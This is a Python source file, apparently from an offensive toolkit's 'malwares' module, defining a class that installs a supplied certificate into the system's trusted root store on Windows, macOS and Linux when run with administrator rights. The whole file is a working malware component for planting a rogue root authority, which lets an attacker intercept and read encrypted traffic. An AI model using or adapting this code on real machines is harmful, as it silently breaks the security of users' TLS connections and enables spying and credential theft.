from os.path import isfile, join as path_join, basename
from os import makedirs
from pyhtools.evil_files.malwares.utils import check_os, is_admin
from subprocess import check_output
from shlex import split
from shutil import copy2 as copy

import logging
logging.basicConfig(
    level=logging.DEBUG,
    format='[%(asctime)s] [%(levelname)s] - %(message)s'
)


class CertificateInstaller:

    def __init__(self, certificate_path: str) -> None:
        assert isinstance(certificate_path, str)
        assert isfile(certificate_path)

        self._cert_path = certificate_path
        self._os = check_os()
        self._logger = logging.getLogger(__name__)

    def install(self) -> bool:
        if not is_admin():
            logging.error('Run with admin privileges')
            return False

        match self._os:
            case 'windows':
                cmd = f'certutil -addstore root {self._cert_path}'

            case 'macos':
                cmd = f'security add-trusted-cert -d -p ssl -p basic -k /Library/Keychains/System.keychain {self._cert_path}'

            case 'linux':
                # works only for crt file
                dest_path = '/usr/local/share/ca-certificates/extra'
                file_name = basename(self._cert_path)

                makedirs(dest_path, exist_ok=True)
                copy(self._cert_path, path_join(dest_path, file_name))

                cmd = 'update-ca-certificates'

            case _:
                return False

        cmd = split(cmd)
        check_output(cmd)
        
        return True
